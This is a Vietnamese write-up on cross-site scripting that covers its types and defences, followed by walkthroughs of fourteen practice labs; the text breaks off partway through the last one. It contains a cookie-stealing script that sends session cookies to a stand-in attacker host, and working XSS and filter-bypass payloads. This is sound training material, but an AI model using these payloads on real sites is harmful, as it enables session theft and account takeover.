---
title: 'Web07: Cross-site scripting (XSS)'
tags: [web7]

---

Giới thiệu về cross-site scripting (XSS)
===============
**Cross-site scripting(còn được gọi là XSS)** là một lỗ hổng bảo mật web cho phép kẻ tấn công xâm phạm các tương tác mà người dùng thực hiện với một ứng dụng dễ bị tấn công. Nó cho phép kẻ tấn công phá vỡ chính sách same origin policy (SOP), được thiết kế để tách biệt các trang web khác nhau với nhau. Các lỗ hổng XSS thường cho phép kẻ tấn công giả dạng người dùng nạn nhân, thực hiện bất kỳ hành động nào mà người dùng có thể thực hiện và truy cập bất kỳ dữ liệu nào của người dùng. Nếu người dùng nạn nhân có quyền truy cập đặc quyền vào ứng dụng thì kẻ tấn công có thể giành được toàn quyền kiểm soát tất cả chức năng và dữ liệu của ứng dụng.

# XSS hoạt động như thế nào?
XSS hoạt động bằng cách thao túng một trang web dễ bị tấn công để nó trả về JavaScript độc hại cho người dùng. Khi mã độc thực thi bên trong trình duyệt của nạn nhân, kẻ tấn công hoàn toàn có thể xâm phạm sự tương tác của họ với ứng dụng.
![image](https://hackmd.io/_uploads/HyICCNyQC.png)

Tấn công Cross Site Scripting nghĩa là gửi và chèn lệnh và script độc hại, những mã độc này thường được viết với ngôn ngữ lập trình phía client như Javascript, HTML, VBScript, Flash… Tuy nhiên, cách tấn công này thông thường sử dụng Javascript và HTML. Cách tấn công này có thể được thực hiện theo nhiều cách khác nhau, phụ thuộc vào loại tấn công XSS, những mã độc có thể được phản chiếu trên trình duyệt của nạn nhân hoặc được lưu trữ trong cơ sở dữ liệu và được chạy mỗi khi người dùng gọi chức năng thích hợp. Nguyên nhân chính của loại tấn công này là xác thực đầu vào dữ liệu người dùng không phù hợp, dữ liệu độc hại từ đầu vào có thể xâm nhập vào dữ liệu đầu ra. Mã độc có thể nhập một script và được chèn vào mã nguồn của website. Khi đó trình duyệt không thể biết mã thực thi có phải độc hại hay không. Do đó mã độc hại có thể đang được thực thi trên trình duyệt của nạn nhận hoặc bất kỳ hình thức giả nào đang được hiển thị cho người sử dụng. Có một số hình thức tấn công XSS có thể xảy ra. Bên dưới là những hình thức tấn công chính của Cross Site Scripting:

-   Cross Site Scripting có thể xảy ra trên tập lệnh độc hại được thực hiện ở phía client.
-   Trang web hoặc form giả mạo được hiển thị cho người dùng (nơi nạn nhân nhập thông tin đăng nhập hoặc nhấp vào liên kết độc hại).
-   Trên các trang web có quảng cáo được hiển thị.
-   Email độc hại được gửi đến nạn nhân. Tấn công xảy ra khi tin tặc tìm kiếm những lỗ hổng trên website và gửi nó làm đầu vào độc hại. Tập lệnh độc hại được tiêm vào mã lệnh và sau đó được gửi dưới dạng đầu ra cho người dùng cuối cùng.

Các loại tấn công XSS
=====================

Có 3 loại tấn công XSS chính như sau:

1\. Reflected XSS
-----------------

Reflected XSS phát sinh khi ứng dụng nhận được dữ liệu trong yêu cầu HTTP và bao gồm dữ liệu đó trong phản hồi ngay lập tức theo cách không an toàn.

Có nhiều hướng để khai thác thông qua lỗi Reflected XSS, một trong những cách được biết đến nhiều nhất là chiếm phiên làm việc (session) của người dùng, từ đó có thể truy cập được dữ liệu và chiếm được quyền của họ trên website. Chi tiết được mô tả qua những bước sau:

![](https://images.viblo.asia/28e81cf8-c006-4835-9ef0-a8df7d2ccd12.jpg)

1.  Người dùng đăng nhập web và giả sử được gán session:

Set-Cookie: sessId=5e2c648fa5ef8d653adeede595dcde6f638639e4e59d4

2.  Bằng cách nào đó, hacker gửi được cho người dùng URL:

[http://example.com/name=var+i=new+Image;+i.src=”http://hacker-site.net/”%2Bdocument.cookie;](http://example.com/name=var+i=new+Image;+i.src=%E2%80%9Dhttp://hacker-site.net/%E2%80%9D%2bdocument.cookie;)

Giả sử [example.com](http://example.com/) là website nạn nhân truy cập, [hacker-site.net](http://hacker-site.net/) là trang của hacker tạo ra

3.  Nạn nhân truy cập đến URL trên
    
4.  Server phản hồi cho nạn nhân, kèm với dữ liệu có trong request (đoạn javascript của hacker)
    
5.  Trình duyệt nạn nhân nhận phản hồi và thực thi đoạn javascript
    
6.  Đoạn javascript mà hacker tạo ra thực tế như sau:
    

var i=new Image; i.src=”[http://hacker-site.net/”+document.cookie;](http://hacker-site.net/%E2%80%9D+document.cookie;)

Dòng lệnh trên bản chất thực hiện request đến site của hacker với tham số là cookie người dùng:

GET /sessId=5e2c648fa5ef8d653adeede595dcde6f638639e4e59d4 HTTP/1.1

Host: [hacker-site.net](http://hacker-site.net/)

7.  Từ phía site của mình, hacker sẽ bắt được nội dung request trên và coi như session của người dùng sẽ bị chiếm. Đến lúc này, hacker có thể giả mạo với tư cách nạn nhân và thực hiện mọi quyền trên website mà nạn nhân có.

**Ảnh hưởng của Reflected XSS:**

Nếu kẻ tấn công có thể kiểm soát tập lệnh được thực thi trong trình duyệt của nạn nhân thì chúng thường có thể xâm phạm hoàn toàn người dùng đó. Trong số những thứ khác, kẻ tấn công có thể:

* Thực hiện bất kỳ hành động nào trong ứng dụng mà người dùng có thể thực hiện.

* Xem bất kỳ thông tin nào mà người dùng có thể xem.

* Sửa đổi bất kỳ thông tin nào mà người dùng có thể sửa đổi.

* Bắt đầu tương tác với những người dùng ứng dụng khác, bao gồm cả các cuộc tấn công độc hại, dường như bắt nguồn từ người dùng nạn nhân ban đầu.

2\. Stored XSS:
---------------

Khác với Reflected tấn công trực tiếp vào một số nạn nhân mà hacker nhắm đến, Stored XSS hướng đến nhiều nạn nhân hơn. Lỗi này xảy ra khi ứng dụng web không kiểm tra kỹ các dữ liệu đầu vào trước khi lưu vào cơ sở dữ liệu (ở đây tôi dùng khái niệm này để chỉ database, file hay những khu vực khác nhằm lưu trữ dữ liệu của ứng dụng web). Ví dụ như các form góp ý, các comment … trên các trang web. Với kỹ thuật Stored XSS , hacker không khai thác trực tiếp mà phải thực hiện tối thiểu qua 2 bước.

Đầu tiên hacker sẽ thông qua các điểm đầu vào (form, input, textarea…) không được kiểm tra kỹ để chèn vào CSDL các đoạn mã nguy hiểm.

![](https://images.viblo.asia/72034203-9f22-43d5-8f50-8b9920220fc6.png)

Tiếp theo, khi người dùng truy cập vào ứng dụng web và thực hiện các thao tác liên quan đến dữ liệu được lưu này, đoạn mã của hacker sẽ được thực thi trên trình duyệt người dùng.

![](https://images.viblo.asia/4eb853ff-080d-41d2-8682-84dffadf8ea6.png)

Kịch bản khai thác:

![](https://images.viblo.asia/f0648231-6f0d-4bd7-988a-a471f2a05e37.png)

Reflected XSS và Stored XSS có 2 sự khác biệt lớn trong quá trình tấn công.

-   Thứ nhất, để khai thác Reflected XSS, hacker phải lừa được nạn nhân truy cập vào URL của mình. Còn Stored XSS không cần phải thực hiện việc này, sau khi chèn được mã nguy hiểm vào CSDL của ứng dụng, hacker chỉ việc ngồi chờ nạn nhân tự động truy cập vào. Với nạn nhân, việc này là hoàn toàn bình thường vì họ không hề hay biết dữ liệu mình truy cập đã bị nhiễm độc.
    
-   Thứ 2, mục tiêu của hacker sẽ dễ dàng đạt được hơn nếu tại thời điểm tấn công nạn nhân vẫn trong phiên làm việc(session) của ứng dụng web. Với Reflected XSS, hacker có thể thuyết phục hay lừa nạn nhân đăng nhập rồi truy cập đến URL mà hắn ta cung cấp để thực thi mã độc. Nhưng Stored XSS thì khác, vì mã độc đã được lưu trong CSDL Web nên bất cứ khi nào người dùng truy cập các chức năng liên quan thì mã độc sẽ được thực thi, và nhiều khả năng là những chức năng này yêu cầu phải xác thực(đăng nhập) trước nên hiển nhiên trong thời gian này người dùng vẫn đang trong phiên làm việc.
    

Từ những điều này có thể thấy Stored XSS nguy hiểm hơn Reflected XSS rất nhiều, đối tượng bị ảnh hưởng có thế là tất cả nhưng người sử dụng ứng dụng web đó. Và nếu nạn nhân có vai trò quản trị thì còn có nguy cơ bị chiếm quyền điều khiển web.

3\. DOM Based XSS
-----------------

DOM Based XSS là kỹ thuật khai thác XSS dựa trên việc thay đổi cấu trúc DOM của tài liệu, cụ thể là HTML. Chúng ta cùng xem xét một ví dụ cụ thể sau.

Một website có URL đến trang đăng ký như sau:

[http://example.com/register.php?message=Please](http://example.com/register.php?message=Please) fill in the form

Khi truy cập đến thì chúng ta thấy một Form rất bình thường

![](https://images.viblo.asia/2cfc5b4c-2e62-4ca3-9a0e-2a033830d3ff.png)

Thay vì truyền

**message=Please fill in the form**

thì truyền

message=<label>Gender</label>

<select class = "form-control" onchange="java\_script\_:show()"><option value="Male">Male</option><option value="Female">Female</option></select>

<script>function show(){alert();}</script>

Khi đấy form đăng ký sẽ trở thành như thế này:

![](https://images.viblo.asia/4bdaaffe-6e9f-4a3d-a980-309dfe6f2d44.png)

Người dùng sẽ chẳng chút nghi ngờ với một form “bình thường” như thế này, và khi lựa chọn giới tính, Script sẽ được thực thi

![](https://images.viblo.asia/eca2b478-9da6-43f7-a48a-c98387898400.png)

Kịch bản khai thác:

![](https://images.viblo.asia/cc00ebb0-67cc-4110-91e4-4188104777fd.png)

Cách để kiểm thử tấn công XSS
=============================

Trước tiên, để kiểm thử tấn công XSS, kiểm thử hộp đen có thể được thực hiện. Nó có nghĩa là, chúng ta có thể test mà không cần xem xét code. Tuy nhiên, xem xét code luôn là một việc nên làm và nó mang lại kết quả đáng tin cậy.

Trong khi bắt đầu kiểm thử, Tester nên xem xét phần nào của website là có thể bị tấn công XSS. Tốt hơn là liệt kê chúng trong tài liệu kiểm thử và bằng cách này, bảo đảm chúng ta sẽ không bị bỏ xót. Sau đó, tester nên lập kế hoạch cho các script nào phải được kiểm tra. Điều quan trọng là, kết quả có ý nghĩa gì, ứng dụng đó là dễ bị lỗ hổng và cần được phân tích các kết quả một cách kỹ lưỡng. Trong khi kiểm thử các cuộc tấn công có thể, điều quan trọng là kiểm tra xem nó đang được đáp ứng như thế nào với các kịch bản đã nhập và các kịch bản đó có được thực thi hay không vv.

Ví dụ, tester có thể thử nhập trên trình duyệt đoạn script sau:

**<script>alert(document.cookie)</script>**

Nếu script được thực hiện, thì có một khả năng rất lớn, rằng XSS là có thể. Ngoài ra, trong khi kiểm thử thủ công để có thể tấn công Cross Site Scripting, điều quan trọng cần nhớ là các dấu ngoặc được mã hóa cũng nên được thử.

Các cách để ngăn chặn XSS
=========================

Mặc dù loại tấn công này được coi là một trong những loại nguy hiểm và rủi ro nhất, nhưng vẫn nên chuẩn bị một kế hoạch ngăn ngừa. Bởi vì sự phổ biến của cuộc tấn công này, có khá nhiều cách để ngăn chặn nó.

Các phương pháp phòng ngừa chính được sử dụng phổ biến bao gồm:
-   Data validation
-   Filtering
-   Escaping

Bước đầu tiên trong công tác phòng chống tấn công này là Xác thực đầu vào. Mọi thứ, được nhập bởi người dùng phải được xác thực chính xác, bởi vì đầu vào của người dùng có thể tìm đường đến đầu ra. Xác thực dữ liệu có thể được đặt tên làm cơ sở để đảm bảo tính bảo mật của hệ thống. Tôi sẽ nhắc nhở rằng ý tưởng xác thực không cho phép đầu vào không phù hợp. Vì vậy nó chỉ giúp giảm thiểu rủi ro, nhưng có thể không đủ để ngăn chặn lỗ hổng XSS có thể xảy ra.

Một phương pháp ngăn chặn tốt khác là lọc đầu vào của người dùng. Ý tưởng lọc là tìm kiếm các từ khóa nguy hiểm trong mục nhập của người dùng và xóa chúng hoặc thay thế chúng bằng các chuỗi trống. Những từ khóa đó có thể là:

* Thẻ <script> </ script>
* Lệnh Javascript
* Đánh dấu HTML
* Lọc đầu vào khá dễ thực hành. Nó có thể được thực hiện theo nhiều cách khác nhau. Như:
* Bởi các developers đã viết mã phía server.
* Thư viện ngôn ngữ lập trình thích hợp đang được sử dụng.

Trong trường hợp này, một số developer viết mã riêng của họ để tìm kiếm các từ khóa thích hợp và xóa chúng. Tuy nhiên, cách dễ dàng hơn là chọn thư viện ngôn ngữ lập trình thích hợp để lọc đầu vào của người dùng. Tôi muốn lưu ý rằng việc sử dụng thư viện là một cách đáng tin cậy hơn, vì các thư viện đó đã được nhiều nhà phát triển sử dụng và thử nghiệm.

Một phương pháp phòng ngừa khác có thể là ký tự Escape. Trong thực tế này, các ký tự thích hợp đang được thay đổi bằng các mã đặc biệt.

Ví dụ: <ký tự Escape có thể giống như & # 60. Điều quan trọng cần biết là chúng ta có thể tìm thấy các thư viện thích hợp với ký tự escape.

Trong khi đó, việc kiểm thử tốt cũng không nên quên điều đó. Chúng ta cần những kiểm thử phần mềm có kiến thức tốt và những công cụ kiểm thử phần mềm đáng tin cậy. Bằng cách này, chất lượng phần mềm sẽ được bảo đảm tốt hơn.

# **1. Lab: Reflected XSS into HTML context with nothing encoded**
>Mô tả cho biết bài lab chứa 1 lỗ hổng Reflected XSS ở chức năng tìm kiếm. Để giải quyết bài lab, hãy sử dụng XSS để gọi hàm alert():
![image](https://hackmd.io/_uploads/S1qvSrkX0.png)

>Truy cập bài lab và thấy chức năng tìm kiếm sản phẩm: ![image](https://hackmd.io/_uploads/B1xePSkQ0.png)

>Để có thể gọi hàm alert(), mình sẽ chèn thêm vào phần tìm kiếm 1 đoạn mã JavaScript vào, payload: `<script>alert(123)</script>`

>Hàm alert() được gọi thành công và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/B12KwHJmA.png)

# **2. Lab: Stored XSS into HTML context with nothing encoded**
> Mô tả cho biết bài lab chứa 1 lỗ hổng Stored XSS ở chức năng bình luận. Để giải quyết bài lab, hãy sử dụng XSS để gọi hàm alert() khi submit comment:
> ![image](https://hackmd.io/_uploads/SyYDKByXC.png)

>Truy cập bài lab và có chức năng comment bên dưới mỗi bài viết: ![image](https://hackmd.io/_uploads/HklcFrJ7C.png)

>Thử chèn payload XSS vào trường `name` để kiểm tra: ![image](https://hackmd.io/_uploads/HJEG9Sk7R.png)

>Khi tải lại bài post thì chưa thấy đoạn mã được thực thi =>fail, tiếp tục thử với các trường còn lại. Thử với trường `comment`: ![image](https://hackmd.io/_uploads/B18tcH1XC.png)

>Tải lại bài, đoạn mã XSS chèn vào đã được thực thi: ![image](https://hackmd.io/_uploads/BkHGsSy7R.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/H1TciB17C.png)

# **3. Lab: DOM XSS in document.write sink using source location.search**
> Mô tả nói rằng chức năng search sử dụng hàm JS `document.write` để hiển thị thông tin lên màn hình, và hàm này lấy dữ liệu từ `location.search`, nơi mà ta có thể điều khiển URL website. Để hoàn thành bài lab, thành công XSS bằng cách gọi được hàm alert()
![image](https://hackmd.io/_uploads/Bke07--mA.png)

>Truy cập lab thì có chức năng tìm kiếm sản phẩm:
>![image](https://hackmd.io/_uploads/By86dZWmA.png)

>Thử chèn 1 đoạn script đơn giản nhưng không có hiệu quả: ![image](https://hackmd.io/_uploads/SkR1jZZmC.png)

>Xem console của web, thấy rằng có 1 đoạn mã JS dùng để thực hiện tìm kiếm các sản phẩm bên phía Client, mà không qua Server. Cụ thể là nó sẽ không lọc input người dùng nhập vào trong biến **query** .Mà hàm `window.location.search` sẽ lấy luôn phần param (từ phần dấu ? trở đi) trong URL để thực hiện nối chuỗi đó vào làm tham số trong `document.write`  
![image](https://hackmd.io/_uploads/H1_Hco-QR.png)

>Ta có thể dùng payload `test"><script>alert(1)</script>` để bypasss. Cụ thể `test">` sẽ thực hiện đóng thẻ `img` và phần còn lại là thực thi `alert`: ![image](https://hackmd.io/_uploads/BypYRjZQR.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/Bk6qAjZm0.png)

# **4. Lab: DOM XSS in document.write sink using source location.search inside a select element**
> Mô tả nói rằng chức năng search sử dụng hàm JS `document.write` để hiển thị thông tin lên màn hình, và hàm này lấy dữ liệu từ `location.search`, nơi mà ta có thể điều khiển URL website. Để hoàn thành bài lab, thành công XSS bằng cách gọi được hàm alert()
![image](https://hackmd.io/_uploads/ByMxW3-7C.png)

>Truy cập bài lab và có chức năng "Check stock" để xem số lượng hàng của mỗi sản phầm: ![image](https://hackmd.io/_uploads/SJLjb3bXR.png)

>Mở console lên và thấy có 1 đoạn code JS: ![image](https://hackmd.io/_uploads/H1kgz2bXA.png)

> Code này sẽ render ra `<select>` chứa các tên store. Cụ thể, ta có thể control được store cần tìm bằng tham số `storeId`  thông qua `location.search`. Sau đó sink `document.write` được sử dụng để ghi `storeId` đó trực tiếp vào `<option>`.

>Thử thêm tham số `storeId` bằng chuỗi bất kì ta thấy option để select sẽ chứa chuỗi đó: ![image](https://hackmd.io/_uploads/HJrX2BMmC.png)

>Ta có thể thay đổi `storeId` để đóng `<option>`, và đằng sau thực thi lệnh mà ta muốn, ở đây là gọi được hàm `alert()`. Sử dụng payload `test</option><script>alert(1)</script>` : ![image](https://hackmd.io/_uploads/B1xrTBf70.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/H1nH6HG70.png)

# **5. Lab: DOM XSS in innerHTML sink using source location.search**
![image](https://hackmd.io/_uploads/ryK3I8GXC.png)

>Truy cập bài lab và có chức năng tìm kiếm sản phẩm: ![image](https://hackmd.io/_uploads/H1SKc8fXA.png)

> Mở source lên và thấy có 1 đoạn code JS để xử lí input người dùng nhập vào và thực hiện tìm kiếm: ![image](https://hackmd.io/_uploads/B1pn58fXC.png)

> Chuỗi **search** được lấy từ `location.search` và được trang web render ra HTML thông qua `innerHTML`mà không thực hiện lọc đầu vào. Như bài trước, ta sẽ tìm payload để bypass được `innerHTML`. Do `innerHTML` không hỗ trợ tag `script` bên trong, nên ta có thể dùng thẻ `img` để thay thế. Cụ thể, với payload: `<img src=test onerror=alert(1)>`, khi render ra kết quả tìm kiếm, trang web sẽ nhận ra source ảnh không đúng, không tồn tại => kích hoạt trình xử lí sự kiện lỗi **onerror**, và sẽ gọi tới hàm alert() theo ý ta muốn. 

>Sử dụng payload: ![image](https://hackmd.io/_uploads/B1SX68f7R.png)

>Và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/rk4E6LzmA.png)

# **6. Lab: DOM XSS in jQuery anchor href attribute sink using location.search source**
> Mô tả cho biết tồn tại 1 lỗ hổng DOM-Based XSS trong trang submit feedback. Nó sử dụng hàm chọn $ của thư viện jQuery để tìm phần tử neo và thay đổi thuộc tính href của nó bằng cách sử dụng dữ liệu từ `location.search`. Để hoàn thành bài lab, sử dụng alert() để lấy được `document.cookie`:
![image](https://hackmd.io/_uploads/BJMKTLfXC.png)

>Khi click vào thì một GET request được gửi đến `/feedback?returnPath=/` tức là trở về trang chủ. Nếu đọc mã nguồn HTML, có thể thấy có một đoạn script sử dụng JQuery để thêm attribute `href` vào tag `<a>` chứa đường link back ở trên. Và source lấy chính là tham số `returnPath`.
>![image](https://hackmd.io/_uploads/HkqXVDf7C.png)

> Như vậy ta sẽ send request đến `/feedback?returnPath=javascript:alert(document.cookie)` để khi click vào `Back`, hàm alert trong `href="javascript:alert(document.cookie)"` được thực thi: 
> ![image](https://hackmd.io/_uploads/SkdTHwGmA.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/BkBArPz7R.png)

# **7. Lab: DOM XSS in jQuery selector sink using a hashchange event**
>Mô tả cho biết tồn tại 1 lỗ hổng DOM-Based XSS trong trang home page. Nó sử dụng hàm chọn $() của jQuery để tự động cuộn đến một bài đăng nhất định, có tiêu đề được chuyển qua thuộc tính `location.hash`. Hoàn thành bài lab bằng cách gọi hàm print()
![image](https://hackmd.io/_uploads/ryqZ5yXXC.png)

>Đọc HTML source code thì có 1 đoạn script JQuery sử dụng selector `$()` thực hiện auto-scroll người dùng đến bài post có chứa chuỗi hash (lấy từ source `location.hash`) do người dùng nhập vào với prefix `#`. Nó sẽ được thực thi khi event hashchange được kích hoạt.
![image](https://hackmd.io/_uploads/ryZZqk7mA.png)

> Có thể thấy, ta hoàn toàn có thể inject 1 XSS vector thông qua location.hash. Tuy nhiên, ta cần xác định phương thức để kích hoạt hashchange event mà không cần có tương tác của người dùng. Cách đơn giản nhất là sử dụng iframe kiểu như sau:
> `<iframe src="https://0a970055034dfec88295a64d004c0067.web-security-academy.net//#" onload="this.src+='<img src=1 onerror=print()>'"></iframe>`

>Cụ thể, src attribute hướng đến trang có lỗ hổng với hash value rỗng. Khi iframe được load, XSS payload `<img src=1 onerror=print()>` sẽ được gắn vào hash và khiến cho hashchange event được kích hoạt.

>Nhét payload trên vào exploit server để gửi đi cho nạn nhân:
>![image](https://hackmd.io/_uploads/Byh9xxQQA.png)


>Chọn "View exploit" để xem kết quả: ![image](https://hackmd.io/_uploads/SkhVxxQQC.png)


> Thấy rằng hàm print() đã được gọi thành công, chọn "Deliver exploit to victim" để hoàn thành bài lab: 
>![image](https://hackmd.io/_uploads/B1NUxe7m0.png)

# **8. Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded**
>Lab này chứa lỗ hổng XSS DOM-based ở biểu thức AngularJS trong chức năng tìm kiếm. AngularJS là một thư viện JavaScript phổ biến, dùng để quét nội dung của các node HTML chứa thuộc tính `ng-app` . Khi một lệnh được thêm vào mã HTML, bạn có thể thực thi các biểu thức JavaScript trong dấu ngoặc nhọn đôi. Kỹ thuật này rất hữu ích khi dấu ngoặc nhọn được mã hóa. Để giải quyết bài thí nghiệm này, hãy thực hiện một cuộc tấn công XSS để thực thi biểu thức AngularJS và gọi hàm alert().
![image](https://hackmd.io/_uploads/SyN1Wl7mA.png)

>Truy cập bài lab và có chức năng tìm kiếm: ![image](https://hackmd.io/_uploads/B1iuQg77R.png)

>Kiểm tra mã HTML thì phát hiện có `ng-app` directive của AngularJS:
> ![image](https://hackmd.io/_uploads/rJpa4xXQA.png)

>Lúc này, sử dụng Angular expression với payload `{{constructor.constructor('alert(1)')()}}` để khởi tạo một hàm alert() bằng constructor và thực thi nó thông qua {{}} : ![image](https://hackmd.io/_uploads/r1rHSxX70.png)

>Gọi hàm alert() thành công và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/rynLBlX7A.png)

# **9. Lab: Reflected DOM XSS**
![image](https://hackmd.io/_uploads/BkU7Lxm70.png)

>Truy cập bài lab và có chức năng search, thử search 1 chuỗi bất kì: ![image](https://hackmd.io/_uploads/SkmKTlQ7R.png)

>Xem lại các request đã thực hiện, thấy có 1 request JS được gửi đi `searchResults.js`:
>![image](https://hackmd.io/_uploads/HkUvAeQXR.png)

>Nó gọi hàm `eval()`. Trong `eval` khai báo 1 `searchResultsObj` được gán bằng `this.responeText` (input nhập vào).

>Và có 1 request nữa là `/search-results?search=test` là kết quả trả về từ server sau khi truy vấn: ![image](https://hackmd.io/_uploads/ByLAJWmmA.png)

>Để ý thuộc tính `searchTerm` là chuỗi do người dùng nhập vào. Ta sẽ escape thuộc tính `searchTerm` bằng payload `\" - alert(1)} //`. Lúc này khi thực thi, `searchTerm` sẽ là: `{"searchTerm":"\\"-alert(1)}//", "results":[]}` : ![image](https://hackmd.io/_uploads/SybUbZ7QA.png)

>Hàm alert được thực thi và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/ryKobbm7A.png)

# **10. Lab: Stored DOM XSS**
>Bài lab chứa lỗ hổng stored DOM ở chức năng bình luận. Hoàn thành bài lab bằng cách gọi thành công hàm alert(): ![image](https://hackmd.io/_uploads/S1PLz-QmC.png)

>Truy cập bài lab và có chức năng comment ở mỗi bài post: ![image](https://hackmd.io/_uploads/r1F3zZXXC.png)

>Thực hiện comment có chứa chuỗi `test` và sử dụng DOM Invader xem chuỗi `test` thì thấy comment được lưu dạng object vào một mảng: ![image](https://hackmd.io/_uploads/B162FZX7A.png)

>Kiếm được source code js, server sử dụng **JSON.parse** để parse mảng các comment đó rồi bắt đầu xử lý để hiển thị comment.

> Để ý một chút, hàm `escapeHTML()` được sử dụng có chức năng thay thế `<` và `>` lần lượt thành `&lt;` và `&gt;`. Tuy nhiên, nó chỉ thay thế kí tự đầu tiên nó gặp mà thôi. Có một số thuộc tính của comment sử dụng `escapeHTML()` trong đó có `comment.author`: ![image](https://hackmd.io/_uploads/S1JCcWXmC.png)

>Tận dụng điều đó, ta sử dụng payload `<><img src=1 onerror=alert(1)>` tại trường `Name`, chính là `comment.author`. Lúc này chỉ có `<>` bị escapeHTML còn `<img src=1 onerror=alert(1)>` vẫn được giữ nguyên: ![image](https://hackmd.io/_uploads/HyJfoZ7mA.png)

>Submit comment và tải lại trang, thấy rằng hàm alert() đã được thực thi: ![image](https://hackmd.io/_uploads/H1qHi-Qm0.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/r1s8j-770.png)

# **11. Lab: Reflected XSS into HTML context with most tags and attributes blocked**
>Bài lab chứa lỗ hổng Reflected XSS tại chức năng tìm kiếm, nhưng nó sử dụng WAF để chặn lại hầu hết các payload XSS phổ biến. Nhiệm vụ của ta là bypass được WAF và gọi thành công hàm print(): 
![image](https://hackmd.io/_uploads/H18DnZ7mA.png)

>Truy cập bài lab và có chức năng tìm kiếm: ![image](https://hackmd.io/_uploads/BkIiaZmm0.png)

>Tại chức năng tìm kiếm, thử với payload `<img src=1 onerror=alert(1)>` thì bị chặn: ![image](https://hackmd.io/_uploads/B1RY6-7XR.png)

>Và hầu hết các payload XSS đều bị block... 
>Ta sẽ đi bruteforce tất cả các tag để xem các tag không bị block. Search với từ khóa `<$tag$>` với Intruder: ![image](https://hackmd.io/_uploads/SyRXWzmQC.png)

>List tag ta sẽ lấy trong cheatsheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

>Tiến hành Attack, và 2 tag không bị filter là `body` và `custom tags`: ![image](https://hackmd.io/_uploads/SJJF-zQXA.png)

>Ta sẽ lựa chọn tag `body`. Thử search `<body onload=1>` thì thấy event `onload` đã bị block: ![image](https://hackmd.io/_uploads/BJqaWzm7C.png)

>Tương tự, ta đi brute-force các event không bị block: ![image](https://hackmd.io/_uploads/rJAfGzmmC.png)

>Những event dùng được đều có respone = 200. Ta chọn 1 trong số đó, ở đây là `onresize`: 
>Và để trigger XSS mà không cần thao tác người dùng, ta sử dụng `<iframe>` nhằm load body của trang với size khác để kích hoạt `onresize`:
>`<iframe src="https://0af700790309dbf281608998005d00da.web-security-academy.net/?search=%3Cbody%20onresize=print()%3E" onload=this.style.width='150px'>`

>Set payload này vào exploit server và gửi cho nạn nhân: ![image](https://hackmd.io/_uploads/ByY_QMm70.png)

>Gửi cho victim và hàm print được gọi thành công: ![image](https://hackmd.io/_uploads/SJxnXfQ7C.png)

>Hoàn thành bài lab:![image](https://hackmd.io/_uploads/By9nXGQmA.png)

# **12. Lab: Reflected XSS into HTML context with all tags blocked except custom ones**

> Lab chặn hết tất cả các thẻ HTML ngoại trừ các thẻ tùy chỉnh. Hoàn thành bài lab bằng cách thành công XSS và lấy được `document.cookie`: 
![image](https://hackmd.io/_uploads/BJMObEQmA.png)

>Như bài trên, ta tiến hành Intruder để tìm ra các tag không bị chặn: ![image](https://hackmd.io/_uploads/BJFrIV7QC.png)

>Thấy rằng có tag `<img2>` có thể sử dụng được. Dùng payload: 
    ` <img2 onclick=alert(document.cookie)>123 ` 
![image](https://hackmd.io/_uploads/HJ9jPV7QC.png)

>Khi click vào dòng `123`, ta thấy alert thành công. Tuy nhiên, để tấn công mà không cần tương tác từ người dùng, ta search với payload sau:
`<img2 id=a onfocus=alert(document.cookie) tabindex=1>#a`
Payload này sẽ khiến nạn nhân khi load trang sẽ tự động tab đến tag có `id=a` đầu tiên (do `tabindex=1`) và từ đó trigger `onfocus` , từ đó `alert` thành công: ![image](https://hackmd.io/_uploads/H1Qj_4mQC.png)

>Lúc này, tạo 1 đoạn script chuyển trang đến URL chứa payload trên và lưu vào exploit server. 
```
<script>
location = 'https://0a6200eb047f5f6380964e9400e80098.web-security-academy.net/?search=%3Cimg2+id%3Da+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#a';
</script>
```
![image](https://hackmd.io/_uploads/Bki12Nm7C.png)

>Gửi nó cho victim và hoàn thành được bài lab: ![image](https://hackmd.io/_uploads/H1vz3VQQC.png)

# **13. Lab: Reflected XSS with some SVG markup allowed**
    
>Lab chứa lỗ hổng reflected XSS. Trang web đã block hầu hết các tags, nhưng quên 1 số tag SVG và events. Để giải quyết bài lab, thực hiện XSS gọi thành công hàm alert()
![image](https://hackmd.io/_uploads/B1VLErmXA.png)

>Thử tag `<script>` thì đã bị chặn: ![image](https://hackmd.io/_uploads/B1hbUBmQC.png)

>Lúc này, ta sẽ brute-force xem tag nào có thể sử dụng được: 
>![image](https://hackmd.io/_uploads/BkMaPSXQR.png)
                                         
>Kết quả trả về có 4 tag không bị block là `image`, `svg`, `title`, `animatetransform`: ![image](https://hackmd.io/_uploads/r1vRtBX7C.png)

>Như vậy, ta có thể sử dụng tag `animatetransform` trong tag `svg`. Ta tiếp tục dùng Intruder để xem event nào không bị block:![image](https://hackmd.io/_uploads/Skt8orQXC.png)
 

>Kết quả chỉ có `onbegin` không bị filter: ![image](https://hackmd.io/_uploads/S1sViBX70.png)

>Sử dụng payload:  `<svg><animatetransform onbegin=alert(1)>`, ta có thể gọi được hàm alert() thành công: ![image](https://hackmd.io/_uploads/B1t12HQQA.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/SJLehSQXC.png)

# **14. Lab: Reflected XSS into attribute with angle brackets HTML-encoded**
>Bài lab có lỗ hổng reflected XSS ở phần tìm kiếm, trong đó dấu ngoặc nhọn được HTML-encoded. Hoàn thành bài lab bằng cách sử dụng XSS gọi thành công hàm alert()
![image](https://hackmd.io/_uploads/S1FoI8QmA.png)

>Thử với 1 chuỗi vào chức năng tìm kiếm, thấy chuỗi search được HTML encode khi render: ![image](https://hackmd.io/_uploads/Sygt58QXR.png)

>Tuy nhiên, chuỗi nhập vào lại được thêm vào thuộc tính `value` của tag `input` search. Do đó, sử dụng payload `test" onfocus=alert(1) x="` để escape `value` và thêm event onfocus: ![image](https://hackmd.io/_uploads/Sy3j28QXA.png)

>Khi focus vào `input` search thì hàm alert được thực thi:
